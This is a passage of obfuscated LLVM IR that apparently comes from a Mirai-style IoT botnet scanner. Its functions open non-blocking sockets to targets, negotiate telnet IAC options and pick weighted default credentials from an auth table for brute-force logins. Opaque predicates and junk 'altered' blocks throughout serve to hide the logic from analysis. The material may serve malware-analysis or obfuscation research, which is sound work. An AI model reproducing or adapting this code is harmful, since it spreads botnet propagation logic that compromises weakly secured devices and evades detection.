  %96 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %97 = load %struct.sockaddr*, %struct.sockaddr** %96, align 8
  %98 = call i32 @connect(i32 %93, %struct.sockaddr* %97, i32 16)
  %99 = load i32, i32* @x.69
  %100 = load i32, i32* @y.70
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %107

; <label>:107:                                    ; preds = %originalBBpart28, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %108 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %109 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i32 0, i32 1
  %110 = load i32, i32* %109, align 8
  %111 = call i32 @close(i32 %110)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %53
  %112 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %112, i32 0, i32 6
  store i32 0, i32* %113, align 4
  %114 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %115 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %114, i32 0, i32 7
  %116 = getelementptr inbounds [256 x i8], [256 x i8]* %115, i32 0, i32 0
  call void @util_zero(i8* %116, i32 256)
  %117 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %117, i32 0, i32 1
  %119 = load i32, i32* %118, align 8
  %120 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %120, i32 0, i32 1
  %122 = load i32, i32* %121, align 8
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 3, i32 0)
  %_ = sub i32 2048, %123
  %gen = mul i32 %_, %123
  %124 = or i32 2048, %123
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %119, i32 4, i32 %124)
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %126, align 4
  %127 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %128 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %127, i32 0, i32 4
  %129 = load i32, i32* %128, align 4
  %130 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %131 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %130, i32 0, i32 0
  store i32 %129, i32* %131, align 4
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 5
  %134 = load i16, i16* %133, align 8
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %134, i16* %135, align 2
  %136 = load i32, i32* @fake_time, align 4
  %137 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %138 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %137, i32 0, i32 2
  store i32 %136, i32* %138, align 4
  %139 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %140 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %139, i32 0, i32 3
  store i32 1, i32* %140, align 8
  %141 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %142 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %141, i32 0, i32 1
  %143 = load i32, i32* %142, align 8
  %144 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %145 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %145, %struct.sockaddr** %144, align 8
  %146 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %147 = load %struct.sockaddr*, %struct.sockaddr** %146, align 8
  %148 = call i32 @connect(i32 %143, %struct.sockaddr* %147, i32 16)
  br label %originalBB6
}

declare i32 @select(i32, %struct.fd_set.28*, %struct.fd_set.28*, %struct.fd_set.28*, %struct.timeval.29*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = load i32, i32* @x.71
  %2 = load i32, i32* @y.72
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca %struct.scanner_auth*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i16, align 2
  %12 = call i32 @rand_next()
  %13 = load i16, i16* @auth_table_max_weight, align 2
  %14 = zext i16 %13 to i32
  %15 = urem i32 %12, %14
  %16 = trunc i32 %15 to i16
  store i16 %16, i16* %11, align 2
  store i32 0, i32* %10, align 4
  %17 = load i32, i32* @x.71
  %18 = load i32, i32* @y.72
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %originalBBpart226, %originalBBpart2
  %26 = load i32, i32* @x.71
  %27 = load i32, i32* @y.72
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %25
  %34 = load i32, i32* %10, align 4
  %35 = load i32, i32* @auth_table_len, align 4
  %36 = icmp slt i32 %34, %35
  %37 = load i32, i32* @x.71
  %38 = load i32, i32* @y.72
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %36, label %45, label %110

; <label>:45:                                     ; preds = %originalBBpart214
  %46 = load i16, i16* %11, align 2
  %47 = zext i16 %46 to i32
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %49 = load i32, i32* %10, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i64 %50
  %52 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %51, i32 0, i32 2
  %53 = load i16, i16* %52, align 8
  %54 = zext i16 %53 to i32
  %55 = icmp slt i32 %47, %54
  br i1 %55, label %56, label %57

; <label>:56:                                     ; preds = %45
  br label %91

; <label>:57:                                     ; preds = %45
  %58 = load i16, i16* %11, align 2
  %59 = zext i16 %58 to i32
  %60 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %61 = load i32, i32* %10, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i64 %62
  %64 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %63, i32 0, i32 3
  %65 = load i16, i16* %64, align 2
  %66 = zext i16 %65 to i32
  %67 = icmp slt i32 %59, %66
  br i1 %67, label %68, label %89

; <label>:68:                                     ; preds = %57
  %69 = load i32, i32* @x.71
  %70 = load i32, i32* @y.72
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %68
  %77 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %78 = load i32, i32* %10, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %77, i64 %79
  store %struct.scanner_auth* %80, %struct.scanner_auth** %9, align 8
  %81 = load i32, i32* @x.71
  %82 = load i32, i32* @y.72
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %127

; <label>:89:                                     ; preds = %57
  br label %90

; <label>:90:                                     ; preds = %89
  br label %91

; <label>:91:                                     ; preds = %90, %56
  %92 = load i32, i32* @x.71
  %93 = load i32, i32* @y.72
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %91
  %100 = load i32, i32* %10, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %10, align 4
  %102 = load i32, i32* @x.71
  %103 = load i32, i32* @y.72
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart226, label %originalBB20alteredBB

originalBBpart226:                                ; preds = %originalBB20
  br label %25

; <label>:110:                                    ; preds = %originalBBpart214
  %111 = load i32, i32* @x.71
  %112 = load i32, i32* @y.72
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %110
  store %struct.scanner_auth* null, %struct.scanner_auth** %9, align 8
  %119 = load i32, i32* @x.71
  %120 = load i32, i32* @y.72
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %127

; <label>:127:                                    ; preds = %originalBBpart230, %originalBBpart218
  %128 = load %struct.scanner_auth*, %struct.scanner_auth** %9, align 8
  ret %struct.scanner_auth* %128

originalBBalteredBB:                              ; preds = %originalBB, %0
  %129 = alloca %struct.scanner_auth*, align 8
  %130 = alloca i32, align 4
  %131 = alloca i16, align 2
  %132 = call i32 @rand_next()
  %133 = load i16, i16* @auth_table_max_weight, align 2
  %134 = zext i16 %133 to i32
  %_ = shl i32 %132, %134
  %_1 = shl i32 %132, %134
  %_2 = sub i32 0, %132
  %gen = add i32 %_2, %134
  %_3 = sub i32 0, %132
  %gen4 = add i32 %_3, %134
  %_5 = sub i32 0, %132
  %gen6 = add i32 %_5, %134
  %_7 = sub i32 %132, %134
  %gen8 = mul i32 %_7, %134
  %_9 = shl i32 %132, %134
  %_10 = sub i32 %132, %134
  %gen11 = mul i32 %_10, %134
  %135 = urem i32 %132, %134
  %136 = trunc i32 %135 to i16
  store i16 %136, i16* %131, align 2
  store i32 0, i32* %130, align 4
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %25
  %137 = load i32, i32* %10, align 4
  %138 = load i32, i32* @auth_table_len, align 4
  %139 = icmp slt i32 %137, %138
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %68
  %140 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %141 = load i32, i32* %10, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %140, i64 %142
  store %struct.scanner_auth* %143, %struct.scanner_auth** %9, align 8
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %91
  %144 = load i32, i32* %10, align 4
  %_21 = shl i32 %144, 1
  %_22 = sub i32 0, %144
  %gen23 = add i32 %_22, 1
  %_24 = shl i32 %144, 1
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %10, align 4
  br label %originalBB20

originalBB28alteredBB:                            ; preds = %originalBB28, %110
  store %struct.scanner_auth* null, %struct.scanner_auth** %9, align 8
  br label %originalBB28
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %59

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %55, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %58

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %54

; <label>:33:                                     ; preds = %25
  %34 = load i32, i32* @x.73
  %35 = load i32, i32* @y.74
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %10, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  store i8 65, i8* %45, align 1
  %46 = load i32, i32* @x.73
  %47 = load i32, i32* @y.74
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %originalBBpart2, %25
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = load i32, i32* %10, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %10, align 4
  br label %21

; <label>:58:                                     ; preds = %21
  br label %59

; <label>:59:                                     ; preds = %58, %4
  %60 = load i32, i32* @x.73
  %61 = load i32, i32* @y.74
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  %68 = load i32, i32* %9, align 4
  %69 = load i32, i32* @x.73
  %70 = load i32, i32* @y.74
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %68

originalBBalteredBB:                              ; preds = %originalBB, %33
  %77 = load i8*, i8** %6, align 8
  %78 = load i32, i32* %10, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  store i8 65, i8* %80, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  %81 = load i32, i32* %9, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %originalBBpart260, %104, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %361

; <label>:17:                                     ; preds = %11
  %18 = load i32, i32* @x.75
  %19 = load i32, i32* @y.76
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i8*, i8** %4, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 255
  %30 = load i32, i32* @x.75
  %31 = load i32, i32* @y.76
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %39

; <label>:38:                                     ; preds = %originalBBpart2
  br label %361

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load i32, i32* @x.75
  %41 = load i32, i32* @y.76
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i8*, i8** %4, align 8
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 255
  %52 = load i32, i32* @x.75
  %53 = load i32, i32* @y.76
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %51, label %60, label %343

; <label>:60:                                     ; preds = %originalBBpart24
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %62 = load i8*, i8** %4, align 8
  %63 = call signext i8 @can_consume(%struct.scanner_connection* %61, i8* %62, i32 1)
  %64 = icmp ne i8 %63, 0
  br i1 %64, label %82, label %65

; <label>:65:                                     ; preds = %60
  %66 = load i32, i32* @x.75
  %67 = load i32, i32* @y.76
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = load i32, i32* @x.75
  %75 = load i32, i32* @y.76
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %361

; <label>:82:                                     ; preds = %60
  %83 = load i32, i32* @x.75
  %84 = load i32, i32* @y.76
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %82
  %91 = load i8*, i8** %4, align 8
  %92 = getelementptr inbounds i8, i8* %91, i64 1
  %93 = load i8, i8* %92, align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 255
  %96 = load i32, i32* @x.75
  %97 = load i32, i32* @y.76
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %95, label %104, label %109

; <label>:104:                                    ; preds = %originalBBpart212
  %105 = load i8*, i8** %4, align 8
  %106 = getelementptr inbounds i8, i8* %105, i64 2
  store i8* %106, i8** %4, align 8
  %107 = load i32, i32* %3, align 4
  %108 = add nsw i32 %107, 2
  store i32 %108, i32* %3, align 4
  br label %11

; <label>:109:                                    ; preds = %originalBBpart212
  %110 = load i8*, i8** %4, align 8
  %111 = getelementptr inbounds i8, i8* %110, i64 1
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 253
  br i1 %114, label %115, label %161

; <label>:115:                                    ; preds = %109
  %116 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %116, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %117 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %117, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %118 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %119 = load i8*, i8** %4, align 8
  %120 = call signext i8 @can_consume(%struct.scanner_connection* %118, i8* %119, i32 2)
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %123, label %122

; <label>:122:                                    ; preds = %115
  br label %361

; <label>:123:                                    ; preds = %115
  %124 = load i32, i32* @x.75
  %125 = load i32, i32* @y.76
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %123
  %132 = load i8*, i8** %4, align 8
  %133 = getelementptr inbounds i8, i8* %132, i64 2
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp ne i32 %135, 31
  %137 = load i32, i32* @x.75
  %138 = load i32, i32* @y.76
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %136, label %145, label %146

; <label>:145:                                    ; preds = %originalBBpart216
  br label %178

; <label>:146:                                    ; preds = %originalBBpart216
  %147 = load i8*, i8** %4, align 8
  %148 = getelementptr inbounds i8, i8* %147, i64 3
  store i8* %148, i8** %4, align 8
  %149 = load i32, i32* %3, align 4
  %150 = add nsw i32 %149, 3
  store i32 %150, i32* %3, align 4
  %151 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %152 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %151, i32 0, i32 1
  %153 = load i32, i32* %152, align 8
  %154 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %155 = call i64 @send(i32 %153, i8* %154, i64 3, i32 16384)
  %156 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %157 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 8
  %159 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %160 = call i64 @send(i32 %158, i8* %159, i64 9, i32 16384)
  br label %325

; <label>:161:                                    ; preds = %109
  %162 = load i32, i32* @x.75
  %163 = load i32, i32* @y.76
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %161
  %170 = load i32, i32* @x.75
  %171 = load i32, i32* @y.76
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %178

; <label>:178:                                    ; preds = %originalBBpart220, %145
  %179 = load i32, i32* @x.75
  %180 = load i32, i32* @y.76
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %178
  %187 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %188 = load i8*, i8** %4, align 8
  %189 = call signext i8 @can_consume(%struct.scanner_connection* %187, i8* %188, i32 2)
  %190 = icmp ne i8 %189, 0
  %191 = load i32, i32* @x.75
  %192 = load i32, i32* @y.76
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %190, label %216, label %199

; <label>:199:                                    ; preds = %originalBBpart224
  %200 = load i32, i32* @x.75
  %201 = load i32, i32* @y.76
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %199
  %208 = load i32, i32* @x.75
  %209 = load i32, i32* @y.76
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %361

; <label>:216:                                    ; preds = %originalBBpart224
  store i32 0, i32* %5, align 4
  br label %217

; <label>:217:                                    ; preds = %296, %216
  %218 = load i32, i32* @x.75
  %219 = load i32, i32* @y.76
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %217
  %226 = load i32, i32* %5, align 4
  %227 = icmp slt i32 %226, 3
  %228 = load i32, i32* @x.75
  %229 = load i32, i32* @y.76
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart232, label %originalBB30alteredBB

